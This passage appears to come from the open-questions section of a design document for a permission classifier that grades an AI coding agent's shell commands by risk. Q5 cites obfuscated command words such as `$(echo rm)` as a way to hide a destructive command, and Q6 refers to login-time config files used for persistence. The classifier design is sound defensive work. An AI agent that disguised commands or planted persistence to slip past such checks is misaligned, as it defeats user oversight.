  whether `.envrc` belongs on the F4 list.
- **Q5.** "Unknown defaults to Caution" is Decided. Should a non-literal command word (`$(echo rm)`,
  `$X`) be the one exception and default to Destructive (F8)?
- **Q6.** Which window-manager and desktop config paths run commands at login on your machine, for the
  persistence floor in F10?
- **Q7.** Should option 2 ever be offered from the deck (F5), or only ever typed in the terminal?
- **Q8.** May the fixtures be recaptured with a prompting permission mode for Bash, Edit, Write and
  WebFetch (F17)? Recapture starts a real Claude Code session and needs your authorisation.
